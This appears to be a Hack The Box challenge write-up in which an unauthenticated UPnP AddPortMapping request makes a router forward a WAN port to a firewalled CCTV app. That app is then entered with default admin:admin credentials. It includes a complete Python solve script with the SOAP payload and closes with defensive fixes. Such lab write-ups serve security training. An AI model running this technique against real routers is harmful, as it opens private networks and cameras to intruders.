---
title: "Inside Scoop"
date: 2027-11-25 09:00:00 -0500
categories: [HackTheBox, Challenges, Hardware]
tags: [hackthebox, challenge, hardware, upnp, igd, ssdp, miniupnpd, port-forwarding, pivot]
description: "A 'Hardware' challenge that is really protocol analysis: a UPnP Internet Gateway Device forwards a port to an arbitrary internal host with no authentication, letting an outside attacker pivot to a firewalled CCTV app and stop the feed."
---

## Overview

Inside Scoop is a Hardware (Easy) challenge, but there is no logic-analyzer capture to decode — it is pure network protocol analysis. You are given a packet capture and a network diagram. A router runs a [UPnP](https://cwe.mitre.org/data/definitions/441.html) Internet Gateway Device (IGD) that will install a WAN→LAN port-forwarding rule for *anyone*, with no authentication and no check that the forward points back at the requester. That lets an external attacker reach a firewalled internal CCTV web app, log in with default credentials, and "stop the feed" — revealing the flag.

## The technique

The challenge files are `lan_capture.pcap` and `network_layout.png`. The diagram lays out three zones:

```
[Docker (WAN2)] --API/E-port--> [Router (WAN/LAN)] --I-port--> [Camera System (LAN)]
   Port-1 / Port-2                UPnP IGD (MiniUPnPd)          Express CCTV app :8084
```

with one load-bearing note: *"Use as external port the same number as the internal port (not the port exposed in the docker container)."*

Two things stand out in the pcap:

1. **SSDP / UPnP discovery.** A device sends `M-SEARCH * ssdp:all` and the router (`192.168.1.11`) answers with `LOCATION: http://192.168.1.11:8052/lunar_valley_access_control/rootDesc.xml`.
2. **An HTTP login flow** to a CCTV web app on the LAN at `192.168.1.10:8084` (`/login`, `/api/login`, `/dashboard`).

The camera app lives on the LAN, unreachable from outside. But the router's IGD exposes the standard `WANIPConnection:1` SOAP service, and MiniUPnPd here accepts `AddPortMapping` with **no authentication and no validation that `NewInternalClient` is the requester** — a textbook confused-deputy ([CWE-441](https://cwe.mitre.org/data/definitions/441.html)) combined with [missing authentication on a state-changing action](https://cwe.mitre.org/data/definitions/306.html). So we tell the router to forward a WAN port straight to the camera.

## Solution

The live instance exposes two WAN ports: one is the UPnP control plane, the other is the WAN-side exposure of whatever you forward.

Pull the IGD description to find the control URL:

```bash
curl -s http://<ip>:<upnp_port>/lunar_valley_access_control/rootDesc.xml
# -> WANIPConnection:1 controlURL = /system/control/IPConn
# -> Server: ... MiniUPnPd/2.3.0
```

Install the port mapping — external port == internal port == `8084` (the camera's real port), client = the LAN camera. This is exactly the diagram's warning: use the service's real port, **not** the random docker-exposed port number.

The whole solve is one script. `solve.py`:

```python
#!/usr/bin/env python3
import sys, re, requests

ip, upnp, wan = sys.argv[1], sys.argv[2], sys.argv[3]
CAM_IP, CAM_PORT = "192.168.1.10", 8084   # LAN camera service from the pcap

# 1) Unauthenticated UPnP AddPortMapping: external==internal==8084 -> the camera.
soap = f"""<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
<NewRemoteHost></NewRemoteHost>
<NewExternalPort>{CAM_PORT}</NewExternalPort>
<NewProtocol>TCP</NewProtocol>
<NewInternalPort>{CAM_PORT}</NewInternalPort>
<NewInternalClient>{CAM_IP}</NewInternalClient>
<NewEnabled>1</NewEnabled>
<NewPortMappingDescription>scoop</NewPortMappingDescription>
<NewLeaseDuration>0</NewLeaseDuration>
</u:AddPortMapping>
</s:Body>
</s:Envelope>"""
r = requests.post(f"http://{ip}:{upnp}/system/control/IPConn", data=soap, headers={
    "Content-Type": 'text/xml; charset="utf-8"',
    "SOAPAction": '"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"',
}, timeout=10)
assert "AddPortMappingResponse" in r.text, f"mapping failed: {r.text}"
print("[+] port mapping added")

# 2) Now the camera app is reachable via the WAN-side port. Log in (default creds).
base = f"http://{ip}:{wan}"
s = requests.Session()
s.post(f"{base}/api/login", json={"username": "admin", "password": "admin"}, timeout=10)
html = s.get(f"{base}/dashboard", timeout=10).text

# 3) The flag is embedded in the (hidden) .flag element of the dashboard.
m = re.search(r"HTB\{[^}]*\}", html)
print("[+] FLAG:", m.group(0) if m else "NOT FOUND")
```

Run it against the live instance:

```bash
python3 solve.py <ip> <upnp_port> <wan_port>
# [+] port mapping added
# [+] FLAG: HTB{...}
```

The camera app authenticates with the obvious default `admin:admin`, hands back a JWT session cookie, and `/dashboard` returns HTML containing a hidden `<p class="flag">` element. The dashboard's "firmware update" button simply swaps the camera feeds to static noise and un-hides that element client-side — that is the in-story "stop the feed." The flag is already in the page.

## Why it worked

The IGD is meant to let LAN hosts open their own inbound ports. The flaw is that this implementation forwarded to an *arbitrary* internal host (`NewInternalClient` was never checked against the caller) and required no authentication, so a WAN-side attacker could turn the router into a tunnel into the LAN. The downstream camera then fell to a default credential. The single trap that trips people up is the port number: the external port must equal the service's real internal port (`8084`), not the randomized port the container exposes.

## Fix / defense

- Restrict `AddPortMapping` so `NewInternalClient` must equal the requester's source IP (IGD/PCP guidance).
- Bind the UPnP control endpoint to the LAN interface only; never expose it on the WAN.
- Require authorization for all state-changing IGD actions, and disable UPnP IGD if it is not needed.
- Don't ship default credentials on the downstream device.
